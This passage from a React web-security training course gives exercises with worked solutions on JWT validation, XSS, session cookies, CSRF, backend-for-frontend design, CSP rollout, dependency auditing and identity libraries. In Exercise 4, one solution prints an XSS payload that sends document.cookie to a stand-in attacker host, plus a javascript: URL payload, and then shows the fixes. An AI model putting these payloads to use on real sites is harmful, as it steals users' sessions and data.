Replace it with the requireAuth middleware from Section 5.2, which calls jwtVerify with a remote JWKS, an expected issuer and audience, and an explicit algorithm list[14]. jwt-decode is fine in React for reading display claims, never for security decisions.

Exercise 4. Comments with HTML

A blog renders comments that users write in Markdown. The server converts Markdown to HTML and React renders it with <div dangerouslySetInnerHTML={{ __html: comment.html }} />. Users can also set a "website" shown as <a href={user.website}>. Describe two attacks and fix both.

Show solution

Attack 1: Markdown converters commonly pass through raw HTML, so a comment containing <img src=x onerror="fetch('https://evil.example/?c='+document.cookie)"> executes in every reader's browser. React does not sanitise dangerouslySetInnerHTML[40].

Attack 2: a website value of javascript:fetch('/api/me').then(...) runs when clicked. React escapes text, but a URL attribute is not text[38,41].

Fix: sanitise HTML with DOMPurify immediately before rendering and allow only http:/https: URLs, using the SafeHtml and safeUrl helpers from Section 11.2[42]. Validate the website field on the server as well, and add a strict CSP so any missed injection is blocked from running[47].

Exercise 5. Write the session cookie

Write a Set-Cookie header for a session cookie served by app.example.com that must not be readable from JavaScript, must not be sent over HTTP, must not be shared with other subdomains, should not be sent on cross-site POSTs, and should expire after 20 minutes of inactivity. Justify each attribute.

Show solution 
Set-Cookie: __Host-sid=<random>; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=1200
  • __Host- prefix with Path=/ and no Domain: host-only and cannot be set by sibling subdomains[16,20].
  • Secure: HTTPS only. HttpOnly: not exposed to document.cookie[16].
  • SameSite=Lax: not sent on cross-site subresource requests or POSTs, but still sent when a user follows a link to the app (Strict would also work, at some UX cost)[16].
  • Max-Age=1200 re-issued on each request implements a 20-minute sliding window; the server must also enforce the idle and an absolute timeout itself[15].

Exercise 6. Does this API need CSRF protection?

For each design, say whether CSRF protection is needed and why: (a) a BFF where React calls /api/* with a session cookie; (b) an API that accepts only Authorization: Bearer tokens supplied by the Auth0 React SDK and has no cookies; (c) the same as (b), but someone "simplifies" it by also accepting the token from a cookie.

Show solution

(a) Yes. Cookies are attached automatically to requests to your origin, so a forged cross-site request carries the session. Use a synchronizer or signed double-submit token plus SameSite and Origin checks[44].

(b) Not in the classic sense. An attacker's page cannot cause the victim's browser to attach your bearer token, because the SPA attaches it explicitly in JavaScript[4]. XSS remains the threat.

(c) Yes again. As soon as the credential is sent by cookie, the browser attaches it automatically and CSRF defences are required[44].

Exercise 7. Choose an architecture

You are building an online banking dashboard in React. Product wants "the simplest possible setup": the SPA uses an OIDC SDK and stores refresh tokens in localStorage so users stay logged in for 30 days. What do you recommend, citing the relevant guidance?

Show solution

Recommend a Backend for Frontend. RFC 10017 identifies the BFF pattern as the strongest option and recommends it for business and sensitive applications, because tokens are held by a confidential client on the server and the browser holds only an HttpOnly session cookie[5]. Long-lived refresh tokens in localStorage can be read by any injected script and used from the attacker's machine, which OWASP advises against[17]. With a BFF, add CSRF protection (Section 12), strict cookie flags (Section 7), session timeouts suited to a financial service[15], and keep API authorization server-side (Section 10). Auth.js in a Next.js app, or a small Node/Express BFF, are practical ways to implement it.

Exercise 8. Ship a CSP

Your Vite-built SPA is served by Express. Write middleware that sets a strict CSP, and explain what will break and how to roll it out safely.

Show solution

Use the serveIndex handler from Section 13, which generates a fresh nonce per response, sets script-src 'nonce-…' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none', and adds the nonce to the build's <script> tags[47]. Serve static assets separately (for example express.static('dist', { index: false })) so only the HTML is templated.

What breaks: inline event-handler attributes in static HTML, inline scripts without the nonce (for example an analytics snippet pasted into index.html), eval-based libraries, and plugins injecting <object>[45]. React's own onClick props are unaffected because React attaches listeners in JavaScript. Roll out with Content-Security-Policy-Report-Only and a reporting endpoint, fix violations, then switch to the enforcing header[45,46].

Exercise 9. Fail the build on vulnerable dependencies

Add a CI step that fails on high or critical vulnerabilities in production dependencies, and explain why npm ci matters. Then explain what you would do on the day an advisory like CVE-2025-55182 is published.

Show solution 
- run: npm ci
- run: npm audit --omit=dev --audit-level=high

npm ci installs exactly what the lockfile specifies and fails if package.json and the lockfile disagree, so the audited tree is the tree you ship[53]. --audit-level=high makes npm audit exit non-zero only for high or critical findings[50].

On advisory day: read the vendor's advisory to identify affected packages and fixed versions[49]; check whether you use them (npm ls react-server-dom-webpack, or the Dependabot alert[51]); upgrade and redeploy; then review logs for exploitation and rotate secrets if the vulnerability allowed code execution on the server.

Exercise 10. Pick the library

Match each scenario to a library from Section 8 and name the backend check you would implement: (a) internal app for a company on Microsoft 365; (b) self-hosted identity required by a public-sector client; (c) Next.js app that must keep tokens off the client; (d) mobile and web app already on Firebase; (e) AWS-hosted app using API Gateway.

Show solution
  • (a) MSAL React with Microsoft Entra ID; the API validates Entra access tokens for its own audience and app roles[27].
  • (b) Keycloak JS against a self-hosted Keycloak realm; the API validates realm-signed JWTs and roles[28].
  • (c) Auth.js, which runs server-side and keeps sessions in cookies; route handlers call auth() and check roles[30].
  • (d) Firebase Authentication; the backend calls verifyIdToken() and reads custom claims[25,33].
  • (e) AWS Amplify with Cognito; API Gateway uses a Cognito authorizer and handlers check cognito:groups[26,35].

Auth0 and Clerk fit any of these when a hosted identity service is acceptable; in every case the API verifies the token or session itself[23,31].
